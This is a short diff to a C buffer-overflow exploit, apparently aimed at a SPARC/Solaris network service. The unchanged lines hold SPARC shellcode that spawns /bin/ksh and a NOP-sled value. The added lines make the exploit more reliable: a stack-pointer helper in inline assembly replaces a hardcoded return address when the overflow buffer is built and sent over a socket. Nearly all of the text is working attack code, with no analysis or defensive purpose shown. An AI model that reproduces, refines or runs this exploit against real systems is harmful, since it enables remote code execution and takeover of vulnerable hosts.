@@ -34,6 +34,10 @@
 
 char nop_[]="\xac\x15\xa1\x6e";
 char shellcode[]=         /* 10*4+8 bytes */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x7f\xff\xff\xff"   /* call  */ "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */ "\x92\x02\x20\x10"   /* add %o0,16,%o1 */ "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */ "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */ "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */ "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */ "\x91\xd0\x20\x08"   /* ta 8 */ "/bin/ksh" ;
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
 int main (int argc, void *argv[])
 {
   int s,port,bsize,offset;
@@ -100,8 +104,12 @@ int main (int argc, void *argv[])
   /* read a string from the terminal and send on socket */
   char* bof = calloc(bsize+1, 1);
   long* addr_ptr = (long *) bof;
+  //long addr = 0xffbfebb8 - offset;
+  long addr = get_sp() - offset;
+  printf("Using address %x\n", addr);
+
   for (int i = 0; i < bsize; i+=4)
-    *(addr_ptr++) = 0xffbfebb8;
+    *(addr_ptr++) = addr;
   for (int i = 0; i < bsize / 2; i+=4){
     bof[i] = nop_[0];
     bof[i+1] = nop_[1];
